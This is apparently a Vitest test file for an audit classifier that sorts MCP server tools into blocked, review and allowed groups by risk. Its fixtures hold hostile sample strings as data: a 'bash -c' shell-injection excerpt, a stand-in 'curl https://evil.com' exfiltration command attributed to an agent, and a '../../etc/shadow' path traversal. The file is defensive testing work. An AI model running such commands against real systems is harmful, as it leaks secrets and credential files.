import { describe, expect, it } from 'vitest';
import { classifyAuditParts } from './tool-classification';
import type { Inventory, Signal, Verdict } from './types';

describe('classifyAuditParts', () => {
  it('correctly categorizes blocked tools with critical execution signals', () => {
    const inv: Inventory = {
      mode: 'definitions',
      source: 'test-server',
      server: 'test-server',
      tools: [
        { name: 'execute_shell', params: ['cmd'], descLength: 20 },
        { name: 'fetch_url', params: ['url'], descLength: 15 },
        { name: 'search_docs', params: ['query'], descLength: 25 },
      ],
      transcriptChars: 0,
    };

    const signals: Signal[] = [
      {
        rule: 'shell-injection',
        label: 'Arbitrary command execution',
        severity: 'critical',
        target: 'execute_shell.cmd',
        excerpt: 'bash -c',
      },
      {
        rule: 'ssrf-risk',
        label: 'Outbound HTTP request',
        severity: 'high',
        target: 'fetch_url.url',
        excerpt: 'http://',
      },
    ];

    const verdict: Verdict = {
      verdict: 'block',
      risk: 85,
      summary: 'Critical vulnerabilities detected',
      tools: [
        { tool: 'execute_shell', risk: 90, class: 'critical-risk' },
        { tool: 'fetch_url', risk: 55, class: 'elevated-risk' },
        { tool: 'search_docs', risk: 10, class: 'standard-capability' },
      ],
      findings: [
        {
          severity: 'critical',
          title: 'Arbitrary command injection in execute_shell',
          detail: 'Direct shell execution primitive',
          evidence: 'bash -c',
        },
      ],
      guardrails: ['Block execution'],
    };

    const res = classifyAuditParts(inv, verdict, signals);

    expect(res.counts.blocked).toBe(1);
    expect(res.counts.review).toBe(1);
    expect(res.counts.allowed).toBe(1);

    const blocked = res.blocked[0]!;
    expect(blocked.name).toBe('execute_shell');
    expect(blocked.status).toBe('blocked');
    expect(blocked.explanation).toContain('shell');
    expect(blocked.risk).toBe(90);

    const review = res.review[0]!;
    expect(review.name).toBe('fetch_url');
    expect(review.status).toBe('review');
    expect(review.explanation).toContain('network');

    const allowed = res.allowed[0]!;
    expect(allowed.name).toBe('search_docs');
    expect(allowed.status).toBe('allowed');
    expect(allowed.explanation).toContain('safe');
  });

  it('handles clean servers where all tools are allowed', () => {
    const inv: Inventory = {
      mode: 'definitions',
      source: 'docs-mcp',
      server: 'docs-mcp',
      tools: [
        { name: 'search_cloudflare_documentation', params: ['query'], descLength: 30 },
        { name: 'get_page_content', params: ['slug'], descLength: 20 },
      ],
      transcriptChars: 0,
    };

    const verdict: Verdict = {
      verdict: 'allow',
      risk: 5,
      summary: 'Safe',
      tools: [
        { tool: 'search_cloudflare_documentation', risk: 5, class: 'standard-capability' },
        { tool: 'get_page_content', risk: 5, class: 'standard-capability' },
      ],
      findings: [],
      guardrails: [],
    };

    const res = classifyAuditParts(inv, verdict, []);
    expect(res.counts.blocked).toBe(0);
    expect(res.counts.review).toBe(0);
    expect(res.counts.allowed).toBe(2);
    expect(res.allowed[0]?.status).toBe('allowed');
  });

  it('falls back to findings when inventory tools are absent (transcript mode)', () => {
    const verdict: Verdict = {
      verdict: 'block',
      risk: 80,
      summary: 'Host attack',
      tools: [],
      findings: [
        {
          severity: 'critical',
          title: 'Direct command injection observed in agent transcript',
          detail: 'Agent issued curl exfiltration command',
          evidence: 'curl https://evil.com',
        },
        {
          severity: 'high',
          title: 'Path traversal attempted',
          detail: 'Access to /etc/shadow',
          evidence: '../../etc/shadow',
        },
      ],
      guardrails: [],
    };

    const res = classifyAuditParts(null, verdict, []);
    expect(res.counts.blocked).toBe(1);
    expect(res.counts.review).toBe(1);
    expect(res.counts.allowed).toBe(0);
  });
});
